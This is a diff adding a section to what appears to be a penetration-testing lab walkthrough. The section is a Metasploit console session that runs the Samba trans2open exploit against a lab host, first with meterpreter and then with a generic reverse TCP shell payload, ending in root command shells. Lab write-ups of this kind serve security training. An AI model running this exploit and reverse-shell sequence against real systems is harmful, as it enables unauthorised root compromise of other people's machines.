@@ -154,3 +154,92 @@ Shellcodes: No Results
 ```
 
 # 4. Exploiting Samba using metasploit
+
+```
+msf > use exploit/linux/samba/trans2open
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.122.210  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/samba/trans2open) > set LHOST 192.168.123.103
+LHOST => 192.168.123.103
+msf exploit(linux/samba/trans2open) > set RHOSTS 192.168.123.10
+RHOSTS => 192.168.123.10
+msf exploit(linux/samba/trans2open) > run
+[*] Started reverse TCP handler on 192.168.123.103:4444 
+[*] 192.168.123.10:139 - Trying return address 0xbffffdfc...
+[*] 192.168.123.10:139 - Trying return address 0xbffffcfc...
+[*] 192.168.123.10:139 - Trying return address 0xbffffbfc...
+[*] 192.168.123.10:139 - Trying return address 0xbffffafc...
+[*] Sending stage (1079144 bytes) to 192.168.123.10
+[*] 192.168.123.10 - Meterpreter session 1 closed.  Reason: Died
+[*] 192.168.123.10:139 - Trying return address 0xbffff9fc...
+[*] Sending stage (1079144 bytes) to 192.168.123.10
+[*] 192.168.123.10 - Meterpreter session 2 closed.  Reason: Died
+[*] 192.168.123.10:139 - Trying return address 0xbffff8fc...
+[*] Sending stage (1079144 bytes) to 192.168.123.10
+[*] 192.168.123.10 - Meterpreter session 3 closed.  Reason: Died
+[*] 192.168.123.10:139 - Trying return address 0xbffff7fc...
+[*] Sending stage (1079144 bytes) to 192.168.123.10
+[*] 192.168.123.10 - Meterpreter session 4 closed.  Reason: Died
+[*] 192.168.123.10:139 - Trying return address 0xbffff6fc...
+[*] 192.168.123.10:139 - Trying return address 0xbffff5fc...
+[*] 192.168.123.10:139 - Trying return address 0xbffff4fc...
+[*] 192.168.123.10:139 - Trying return address 0xbffff3fc...
+[*] 192.168.123.10:139 - Trying return address 0xbffff2fc...
+^C[-] 192.168.123.10:139 - Exploit failed [user-interrupt]: Interrupt 
+[-] run: Interrupted
+msf exploit(linux/samba/trans2open) > set payload generic/shell_reverse_tcp
+payload => generic/shell_reverse_tcp
+msf exploit(linux/samba/trans2open) > 
+[-] Meterpreter session 1 is not valid and will be closed
+ru[-] Meterpreter session 2 is not valid and will be closed
+[-] Meterpreter session 3 is not valid and will be closed
+[-] Meterpreter session 4 is not valid and will be closed
+whoami
+[*] exec: whoami
+
+paius
+msf exploit(linux/samba/trans2open) > run
+[*] Started reverse TCP handler on 192.168.123.103:4444 
+[*] 192.168.123.10:139 - Trying return address 0xbffffdfc...
+[*] 192.168.123.10:139 - Trying return address 0xbffffcfc...
+[*] 192.168.123.10:139 - Trying return address 0xbffffbfc...
+[*] 192.168.123.10:139 - Trying return address 0xbffffafc...
+[*] 192.168.123.10:139 - Trying return address 0xbffff9fc...
+[*] 192.168.123.10:139 - Trying return address 0xbffff8fc...
+[*] 192.168.123.10:139 - Trying return address 0xbffff7fc...
+[*] 192.168.123.10:139 - Trying return address 0xbffff6fc...
+[*] Command shell session 5 opened (192.168.123.103:4444 -> 192.168.123.10:32825) at 2026-10-07 08:51:24 -0400
+
+[*] Command shell session 6 opened (192.168.123.103:4444 -> 192.168.123.10:32826) at 2026-10-07 08:51:26 -0400
+[*] Command shell session 7 opened (192.168.123.103:4444 -> 192.168.123.10:32827) at 2026-10-07 08:51:27 -0400
+[*] Command shell session 8 opened (192.168.123.103:4444 -> 192.168.123.10:32828) at 2026-10-07 08:51:28 -0400
+whoami
+root
+```
